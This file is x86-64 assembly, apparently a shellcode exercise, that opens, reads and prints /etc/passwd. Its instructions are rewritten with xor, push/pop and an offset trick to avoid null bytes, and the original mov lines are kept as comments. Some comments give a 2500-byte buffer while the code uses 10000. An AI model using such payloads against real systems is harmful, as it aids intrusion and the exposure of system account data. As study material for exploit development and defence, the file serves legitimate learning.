# program needs to open file, read data, write to stdout, exit
        .global _start

        .text
_start:
	# syscall to open
	xor %rax, %rax
	inc %rax
	inc %rax
	#mov 	$2, %rax		# system call num 2 is open
	lea 0x01111129(%rip), %rdi
	sub $0x11110e6, %rdi
	#mov	$path_to_passwd, %rdi
	xor %rsi, %rsi
	#mov	$0, %rsi		# $0 is O_RDONLY according to fcntl.h
	xor %rdx, %rdx
	#mov	$0, %rdx		# mode shouldn't matter anyway (no new file)
	syscall 			# invoke os to do execute the syscall

	xor %r9, %r9
	mov $0x2710, %r9w
	sub %r9, %rsp			# subtract from rsp to allocate mem in buf

	#syscall to read
	push %rax
	pop %rdi
	#mov %rax, %rdi			# return of open is fd of read
	xor %rax, %rax
	#mov $0, %rax 			# system call num  0 is read
	push %rsp
	pop %rsi
	#mov %rsp, %rsi			# allocated space in buffer passed in to write to
	push %r9
	pop %rdx
	#mov $2500, %rdx		# read entire buffer
	syscall

	# syscall to write
	xor %rax, %rax
	inc %rax
	#mov	$1, %rax 		# system call num 1 is write
	xor %rdi, %rdi
	inc %rdi
	#mov	$1, %rdi 		# file descriptor 1 is stdout
	push %rsp
	pop %rsi
	#mov 	%rsp, %rsi		# writing from earlier allocated buffer
	push %r9
	pop %rdx
	#mov	$2500, %rdx		# write whole buffer
	syscall

        # exit(0)
	xor %rax, %rax
	addb $60, %al			# system call 60 is exit
	xor %rdi, %rdi			# we want return code 0
	syscall				# invoke operating system to exit
path_to_passwd:
        .ascii  "/etc/passwd"
